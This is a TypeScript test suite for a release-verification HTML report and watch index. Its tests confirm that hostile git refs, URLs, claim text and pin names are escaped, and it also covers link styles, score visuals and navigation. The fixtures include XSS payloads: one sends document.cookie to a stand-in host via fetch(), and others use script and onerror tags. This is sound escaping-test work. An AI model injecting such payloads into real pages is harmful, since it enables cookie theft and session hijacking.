// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import { toHtml } from "../src/html.ts";
import { toWatchIndexHtml } from "../src/watch-index.ts";
import type { ClaimResult, Report } from "../src/types.ts";

// `git check-ref-format refs/tags/<this>` returns 0, and the GitHub release
// API hands the tag straight to us as headRef.
const HOSTILE = `v1.0"><img/src=x/onerror=fetch('//evil.example/'+document.cookie)>`;

function report(over: Partial<Report> = {}): Report {
  return {
    repoLabel: "victim/app",
    baseRef: "v0.9.0",
    headRef: "v1.0.0",
    stats: { commits: 1, files: 1, additions: 1, deletions: 0 },
    results: [],
    uncovered: [],
    reverseChecked: true,
    metrics: {
      scores: { correctness: 100, completeness: 100, risk: 100, overall: 100, label: "solid" },
      flags: [],
      files: [{ path: "src/a.ts", churn: 10, sensitive: null, coverage: "evidence" }],
      churnCoveredRatio: 1,
      context: { languages: null, codeBytes: null, releaseCadenceDays: null },
      baseline: null,
      unverifiable: null,
    },
    warnings: [],
    truncated: false,
    engine: "off",
    linkBase: "https://github.com/victim/app",
    ...over,
  };
}

/** No `<` from a payload may sit outside a tag we wrote, and no attribute
 * value may be closed by one. Both checks over the raw document. */
function assertNoBreakout(html: string, marker = "img/src=x"): void {
  assert.ok(!html.includes(`<${marker}`), "payload became an element");
  assert.ok(
    !/<a href="[^"]*"><img/.test(html) && !/<a href="[^"]*"\s+on\w+=/.test(html),
    "payload escaped an href attribute",
  );
}

test("a hostile head ref cannot break out of the treemap link", () => {
  const html = toHtml(report({ headRef: HOSTILE }));
  assertNoBreakout(html);
  assert.ok(html.includes("%3E") || html.includes("&quot;"), "the ref is encoded, not dropped");
});

test("a hostile base ref cannot break out either", () => {
  assertNoBreakout(toHtml(report({ baseRef: HOSTILE })));
});

test("a hostile link base cannot break out of commit links", () => {
  const result: ClaimResult = {
    claim: {
      id: 0, section: "Security", text: "Fix the thing", kind: "change",
      prNumbers: [], shas: [], advisories: [], codeSpans: [],
    },
    verdict: "no-evidence",
    confidence: 0.5,
    evidence: { commitShas: ["abc123def456"], files: [], matchedTerms: [], methods: ["none"] },
    reasoning: "nothing found",
    judged: false,
    generated: false,
  };
  const html = toHtml(
    report({
      linkBase: `https://github.com/x"><img/src=x/onerror=alert(1)>`,
      results: [result],
      uncovered: [
        {
          commit: { sha: "abc123def456", subject: "chore", body: "", author: "m", prNumbers: [] },
          additions: 1, deletions: 0, fileCount: 1,
        },
      ],
      metrics: {
        ...report().metrics,
        flags: [{ severity: "critical", kind: "opaque-change", message: "binary", files: [], commitShas: ["abc123def456"] }],
      },
    }),
  );
  assertNoBreakout(html);
});

test("hostile claim text, file paths and reasoning stay text", () => {
  const html = toHtml(
    report({
      results: [
        {
          claim: {
            id: 0, section: `<script>alert('section')</script>`,
            text: `<script>alert('claim')</script>`, kind: "change",
            prNumbers: [], shas: [], advisories: [], codeSpans: [],
          },
          verdict: "no-evidence",
          confidence: 0.5,
          evidence: {
            commitShas: [], files: [`src/<script>alert('path')</script>.ts`],
            matchedTerms: [], methods: ["none"],
          },
          reasoning: `<script>alert('reason')</script>`,
          judged: false,
          generated: false,
        },
      ],
    }),
  );
  assert.ok(!html.includes("<script>alert("), "no payload became a script element");
  assert.ok(html.includes("&lt;script&gt;"), "it is rendered as text instead");
});

test("the watch index escapes a hostile tag, label and report path", () => {
  const html = toWatchIndexHtml(
    {
      version: 1,
      repos: {
        [`x"><img/src=x/onerror=alert(1)>`]: {
          lastPublishedAt: "2026-01-01T00:00:00Z",
          lastTag: HOSTILE,
          history: [],
          latest: {
            tag: HOSTILE,
            publishedAt: "2026-01-01T00:00:00Z",
            checkedAt: "2026-01-02T00:00:00Z",
            score: 10,
            scoreLabel: `suspicious"><img/src=x>`,
            exitCode: 1,
            criticalFlags: 1,
            flagCount: 2,
            flagged: true,
            engine: `off"><img/src=x>`,
            verdicts: { verified: 0, partial: 0, noEvidence: 1, contradicted: 1 },
            report: `x"><img/src=x/onerror=alert(1)>/v1.html`,
          },
        },
      },
    },
    "2026-01-02T00:00:00Z",
  );
  assertNoBreakout(html);
  assert.ok(!html.includes("<img/src=x"), "no payload became an element anywhere");
});

test("scoreRing gives unverified its own color, not the same bucket a genuine 65-84 gets", () => {
  const genuine = toHtml(
    report({
      metrics: {
        scores: { correctness: 70, completeness: 70, risk: 70, overall: 70, label: "minor gaps" },
        flags: [],
        files: [],
        churnCoveredRatio: 1,
        context: { languages: null, codeBytes: null, releaseCadenceDays: null },
        baseline: null,
        unverifiable: null,
      },
    }),
  );
  const unverified = toHtml(
    report({
      metrics: {
        scores: { correctness: 100, completeness: null, risk: 100, overall: 65, label: "unverified" },
        flags: [],
        files: [],
        churnCoveredRatio: 1,
        context: { languages: null, codeBytes: null, releaseCadenceDays: null },
        baseline: null,
        unverifiable: { kind: "sourceless", reason: "no source" },
      },
    }),
  );
  const ringColor = (html: string) => html.match(/stroke="(#[0-9a-f]+)" stroke-width="10" stroke-linecap/)?.[1];
  assert.notEqual(ringColor(unverified), ringColor(genuine));
});

test("gitlab link style spells commit and compare routes with /-/", () => {
  const flagged = report({
    linkBase: "https://gitlab.example.com/group/app",
    linkStyle: "gitlab",
    metrics: {
      ...report().metrics,
      flags: [
        { severity: "warn", kind: "x", message: "m", files: [], commitShas: ["abcdef1234567"] },
      ],
    },
  });
  const html = toHtml(flagged);
  assert.ok(html.includes("https://gitlab.example.com/group/app/-/commit/abcdef1234567"));
  assert.ok(html.includes("/-/compare/v0.9.0...v1.0.0"));
  assert.ok(!html.includes("/app/commit/"), "github route leaked into a gitlab report");
});

test("forgejo reports link commits and compares like github, without sha256 anchors", () => {
  const html = toHtml(report({ linkBase: "https://git.example.com/team/app", linkStyle: "github" }));
  assert.ok(html.includes("https://git.example.com/team/app/compare/v0.9.0...v1.0.0"));
  // The treemap tile still links to the compare view, but the file anchor is
  // a GitHub compare-page feature and must not be fabricated elsewhere.
  assert.ok(!/compare\/v0\.9\.0\.\.\.v1\.0\.0#diff-[0-9a-f]{64}/.test(html), "sha256 anchor on a non-GitHub forge");
  const github = toHtml(report());
  assert.ok(/compare\/v0\.9\.0\.\.\.v1\.0\.0#diff-[0-9a-f]{64}/.test(github), "GitHub reports keep the anchor");
});

test("baseline snapshots render as sparklines with per-release values", () => {
  const html = toHtml(
    report({
      metrics: {
        ...report().metrics,
        baseline: {
          releases: 3,
          medianChurn: 200,
          medianAnchoredCoverage: 0.4,
          snapshots: [
            { tag: "v0.7.0", churn: 100, coverage: 0.2 },
            { tag: "v0.8.0", churn: 200, coverage: 0.4 },
            { tag: "v0.9.0", churn: 400, coverage: 0.6 },
          ],
        },
      },
    }),
  );
  const sparks = html.match(/class="spark"/g) ?? [];
  assert.equal(sparks.length, 2, "one sparkline for churn, one for coverage");
  assert.ok(html.includes("v0.7.0: 100"), "per-release values live in the tooltip");
  // No baseline, no sparkline.
  assert.ok(!toHtml(report()).includes('class="spark"'));
});

test("the report adapts to both color schemes like the watch index", () => {
  const html = toHtml(report());
  assert.ok(html.includes("color-scheme:light dark"), "hard-coded to one scheme");
  assert.ok(html.includes("@media (prefers-color-scheme:dark)"), "no dark override");
  const style = html.slice(html.indexOf("<style>"), html.indexOf("</style>"));
  assert.ok(!/body\{[^}]*#0d1117/.test(style), "body still hard-codes the dark background");
});

test("the report renders the score derivation waterfall", () => {
  const html = toHtml(
    report({
      metrics: {
        ...report().metrics,
        scores: { correctness: 80, completeness: 60, risk: 90, overall: 78, label: "minor gaps" },
        flags: [{ severity: "warn", kind: "k", message: "m", files: [], commitShas: [] }],
      },
    }),
  );
  assert.ok(html.includes("Score derivation"));
  assert.ok(html.includes("perfect release"));
  assert.ok(html.includes("correctness 80 × 0.45"));
  assert.ok(html.includes("completeness 60 × 0.25"));
  assert.ok(html.includes("risk 90 × 0.3"));
  assert.ok(html.includes("78/100 minor gaps"));
});

test("a flag-free release never shows a phantom ±0.0 deduction", () => {
  // correctness 1 / completeness 0 / risk 100: the weighted sum's float
  // residue used to render the risk step as "+0.0" with an amber bar.
  const html = toHtml(
    report({
      metrics: {
        ...report().metrics,
        scores: { correctness: 1, completeness: 0, risk: 100, overall: 30, label: "suspicious" },
        flags: [],
      },
    }),
  );
  assert.ok(!html.includes(">+0.0<") && !html.includes(">−0.0<") && !html.includes(">+0<"));
  const riskRow = html.slice(html.indexOf("risk 100"), html.indexOf("risk 100") + 400);
  assert.ok(!riskRow.includes("wf-comp"), "a zero deduction draws no bar");
  // Exact integer deltas drop the trailing .0 too.
  const capped = toHtml(
    report({
      metrics: {
        ...report().metrics,
        scores: { correctness: 60, completeness: 100, risk: 100, overall: 82, label: "minor gaps" },
        flags: [],
      },
    }),
  );
  assert.ok(capped.includes(">−18<"), "0.45 × 40 renders as −18, not −18.0");
});

test("a watch report links back to its history page and the dashboard", () => {
  const html = toHtml(report(), { historyHref: "index.html", indexHref: "../index.html" });
  assert.ok(html.includes('<a href="index.html">&larr; this repo\'s history</a>'));
  assert.ok(html.includes('<a href="../index.html">all watched repos</a>'));
  assert.ok(html.includes('id="risk-flags"'), "the flags section is linkable on its own");
});

test("a one-off CLI report carries no nav — neither page exists for it", () => {
  const html = toHtml(report());
  assert.ok(!html.includes("all watched repos"));
  assert.ok(!html.includes("this repo&#39;s history") && !html.includes("this repo's history"));
});

test("a hostile nav href cannot break out of its link", () => {
  const html = toHtml(report(), {
    historyHref: `"><img/src=x/onerror=alert(1)>`,
    indexHref: "../index.html",
  });
  assertNoBreakout(html);
});

test("the pins section renders first-party cards and keeps hostile pin names inert", () => {
  const html = toHtml(
    report({
      pins: [
        { name: HOSTILE, from: "1.0", to: "1.1", file: "Makefile", firstParty: true },
        {
          name: "github.com/rs/zerolog",
          from: "v1.31.0",
          to: "v1.32.0",
          file: "go.mod",
          firstParty: false,
        },
      ],
    }),
  );
  assert.match(html, /Version pins moved/);
  assert.match(html, /first-party/);
  assert.match(html, /zerolog/);
  assertNoBreakout(html);
  // No pins, no section.
  assert.ok(!toHtml(report()).includes("Version pins moved"));
});
